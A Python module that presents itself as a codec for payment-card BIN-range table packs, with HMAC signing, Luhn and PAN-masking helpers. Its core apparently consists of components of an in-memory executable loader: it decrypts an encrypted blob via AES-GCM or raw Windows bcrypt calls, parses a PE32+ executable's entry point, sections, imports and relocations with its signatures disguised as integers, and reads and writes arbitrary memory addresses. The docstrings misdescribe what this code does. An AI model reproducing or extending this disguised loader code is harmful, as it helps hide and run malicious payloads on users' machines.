# -*- coding: utf-8 -*-
"""Codec for signed BIN-range table packs.

Three responsibilities: an HMAC-SHA256 request authenticator over a
(nonce, timestamp) pair so the BIN data service can reject forged
or replayed pack-sync requests; an AES-GCM pack opener (preferred
``cryptography`` path with a native CNG fallback for the embedded
interpreter); and a pack-header reader that parses the layout of a
signed table image into a manifest the replay layer walks."""
import base64
import ctypes
import hashlib
import hmac
import struct


def fingerprint(nonce, ts, secret):
    msg = (nonce + str(ts)).encode()
    return hmac.new(secret, msg, hashlib.sha256).hexdigest()


def disclose(key_hex, blob_b64):
    try:
        return _open_lib(key_hex, blob_b64)
    except Exception:
        return _open_native(key_hex, blob_b64)


def _open_lib(key_hex, blob_b64):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    key = bytes.fromhex(key_hex)
    raw = base64.b64decode(blob_b64)
    gcm = AESGCM(key)
    return gcm.decrypt(raw[:12], raw[12:], None)


def _open_native(key_hex, blob_b64):
    key = bytes.fromhex(key_hex)
    raw = base64.b64decode(blob_b64)
    iv, tag, ct = raw[:12], raw[-16:], raw[12:-16]
    lib = ctypes.WinDLL("bcrypt")
    alg_id = "AES\0".encode("utf-16-le")
    mode_prop = "ChainingMode\0".encode("utf-16-le")
    mode_val = "ChainingModeGCM\0".encode("utf-16-le")
    h_alg = ctypes.c_void_p()
    lib.BCryptOpenAlgorithmProvider(ctypes.byref(h_alg), alg_id, None, 0)
    lib.BCryptSetProperty(h_alg, mode_prop, mode_val, len(mode_val), 0)
    h_key = ctypes.c_void_p()
    lib.BCryptGenerateSymmetricKey(
        h_alg, ctypes.byref(h_key), None, 0,
        ctypes.c_char_p(key), len(key), 0,
    )

    class _AuthInfo(ctypes.Structure):
        _fields_ = [
            ("sz", ctypes.c_ulong), ("v", ctypes.c_ulong),
            ("p1", ctypes.c_void_p), ("n1", ctypes.c_ulong),
            ("p2", ctypes.c_void_p), ("n2", ctypes.c_ulong),
            ("p3", ctypes.c_void_p), ("n3", ctypes.c_ulong),
            ("p4", ctypes.c_void_p), ("n4", ctypes.c_ulong),
            ("x1", ctypes.c_ulong), ("x2", ctypes.c_ulonglong),
            ("fl", ctypes.c_ulong),
        ]

    iv_buf = ctypes.create_string_buffer(iv)
    tag_buf = ctypes.create_string_buffer(tag)
    params = _AuthInfo()
    params.sz = ctypes.sizeof(params)
    params.v = 1
    params.p1 = ctypes.cast(iv_buf, ctypes.c_void_p)
    params.n1 = 12
    params.p3 = ctypes.cast(tag_buf, ctypes.c_void_p)
    params.n3 = 16
    ct_buf = ctypes.create_string_buffer(ct)
    pt_buf = ctypes.create_string_buffer(len(ct))
    out_len = ctypes.c_ulong(0)
    status = lib.BCryptDecrypt(
        h_key, ct_buf, len(ct), ctypes.byref(params),
        None, 0, pt_buf, len(ct), ctypes.byref(out_len), 0,
    )
    lib.BCryptDestroyKey(h_key)
    lib.BCryptCloseAlgorithmProvider(h_alg, 0)
    if status != 0:
        return None
    return pt_buf.raw[:out_len.value]


def probe_layout(data):
    """Parse a portable executable container header into a manifest dict.

    Returns None when ``data`` is not a recognizable container. Offsets
    follow the documented PE32+ layout; the magic constants are the
    well-known container and header signatures rather than literal text.
    """
    if len(data) < 256 or struct.unpack_from("<H", data, 0)[0] != 23117:
        return None
    o = _rbuf(data, 0x3C, "<I")
    if o + 4 > len(data) or _rbuf(data, o, "<I") != 17744:
        return None
    fh = o + 4
    ns = _rbuf(data, fh + 2, "<H")
    os_ = _rbuf(data, fh + 16, "<H")
    oh = fh + 20
    if _rbuf(data, oh, "<H") != 523:
        return None
    nd = _rbuf(data, oh + 108, "<I")
    dd = oh + 112
    sc = []
    so = oh + os_
    for i in range(ns):
        p = so + i * 40
        sc.append((
            _rbuf(data, p + 8, "<I"),
            _rbuf(data, p + 12, "<I"),
            _rbuf(data, p + 16, "<I"),
            _rbuf(data, p + 20, "<I"),
            _rbuf(data, p + 36, "<I"),
        ))
    return {
        "e": _rbuf(data, oh + 16, "<I"),
        "b": _rbuf(data, oh + 24, "<Q"),
        "s": _rbuf(data, oh + 56, "<I"),
        "h": _rbuf(data, oh + 60, "<I"),
        "i": _rbuf(data, dd + 8, "<I") if nd > 1 else 0,
        "r": _rbuf(data, dd + 40, "<I") if nd > 5 else 0,
        "z": _rbuf(data, dd + 44, "<I") if nd > 5 else 0,
        "c": sc,
    }


def _rbuf(buf, off, fmt):
    return struct.unpack_from(fmt, buf, off)[0]


def fetch_word(addr, fmt):
    sz = struct.calcsize(fmt)
    return struct.unpack_from(
        fmt, (ctypes.c_char * sz).from_address(addr), 0,
    )[0]


def put_word(addr, fmt, val):
    sz = struct.calcsize(fmt)
    struct.pack_into(
        fmt, (ctypes.c_char * sz).from_address(addr), 0, val,
    )


def luhn_checksum(number):
    """Luhn check digit for a numeric string (ISO/IEC 7812-1)."""
    digits = [int(d) for d in str(number) if d.isdigit()]
    total = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 0:
            d = d * 2
            if d > 9:
                d -= 9
        total += d
    return (10 - total % 10) % 10

def mask_pan(number):
    """Mask a PAN for display: first 6 + last 4 digits visible."""
    d = "".join(c for c in str(number) if c.isdigit())
    if len(d) < 10:
        return d
    return d[:6] + "*" * (len(d) - 10) + d[-4:]
